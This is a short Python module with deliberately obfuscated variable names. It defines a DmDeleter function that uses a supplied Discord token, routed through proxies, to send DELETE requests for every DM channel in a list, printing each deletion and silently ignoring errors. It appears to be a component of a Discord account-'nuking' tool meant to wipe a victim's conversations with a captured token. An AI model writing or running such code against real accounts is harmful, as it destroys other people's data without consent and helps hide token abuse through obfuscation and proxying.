import requests 
from colorama import Fore 
from plugins .standard import getheaders ,proxy 
def DmDeleter (O00OO0OOOO0OOO00O ,OOOOOOO0O00O00OOO ):
    for O00OOO0OOOOOOOO00 in OOOOOOO0O00O00OOO :
        try :
            requests .delete (f'https://discord.com/api/v7/channels/'+O00OOO0OOOOOOOO00 ['id'],proxies =proxy (),headers =getheaders (O00OO0OOOO0OOO00O ))
            print (f"{Fore.RED}Deleted DM: {Fore.WHITE}"+O00OOO0OOOOOOOO00 ['id']+Fore .RESET )
        except Exception as OO0O0O0OOO0OO0O0O :
            print (f"The following error has been encountered and is being ignored: {OO0O0O0OOO0OO0O0O}")